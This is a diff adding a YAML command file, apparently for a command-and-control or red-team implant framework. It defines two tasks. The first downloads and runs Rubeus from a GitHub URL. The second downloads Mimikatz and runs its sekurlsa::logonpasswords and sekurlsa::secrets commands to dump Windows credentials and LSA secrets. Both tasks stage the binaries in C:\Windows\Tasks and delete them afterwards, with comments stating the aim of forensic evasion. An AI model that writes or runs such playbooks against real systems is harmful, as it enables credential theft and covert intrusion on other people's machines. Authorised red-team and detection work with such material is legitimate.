@@ -1,0 +1,56 @@
+commands:
+  - name: ghostpack_execute
+    description: "Download and execute a GhostPack tool"
+    steps:
+      # Reduce sleep time for faster check-in
+      - action: sleep
+        args: [10]
+
+      # Download the GhostPack tool (e.g., Rubeus.exe)
+      - action: http_get
+        args: ["https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/refs/heads/master/Rubeus.exe", "C:\\Windows\\Tasks\\sometool.exe"]
+
+      # Execute the tool using shell command
+      - action: shell
+        args: ["C:\\Windows\\Tasks\\sometool.exe dump"]
+
+      # Delete the tool after execution to reduce forensic footprint
+      - action: delete_file
+        args: ["C:\\Windows\\Tasks\\sometool.exe"]
+
+      # Restore sleep time
+      - action: sleep
+        args: [10]
+        
+  - name: mimikatz_cred_dump
+    description: "Download and execute Mimikatz to dump credentials"
+    steps:
+      # Reduce sleep time for faster check-in
+      - action: sleep
+        args: [10]
+
+      # Download Mimikatz to a less suspicious location
+      - action: http_get
+        args: ["https://github.com/ParrotSec/mimikatz/raw/refs/heads/master/x64/mimikatz.exe", "C:\\Windows\\Tasks\\mimi.exe"]
+
+      # Extract logon passwords
+      - id: dump_logonpasswords
+        action: shell
+        args: ["C:\\Windows\\Tasks\\mimi.exe privilege::debug sekurlsa::logonpasswords exit"]
+        store_output: true
+
+      # Extract LSA secrets
+      - id: dump_secrets
+        action: shell
+        args: ["C:\\Windows\\Tasks\\mimi.exe privilege::debug sekurlsa::secrets exit"]
+        store_output: true
+
+
+      # Delete the Mimikatz binary and output file for forensic evasion
+      - action: delete_file
+        args: ["C:\\Windows\\Tasks\\mimi.exe"]
+
+      # Restore sleep time to normal
+      - action: sleep
+        args: [10]
+
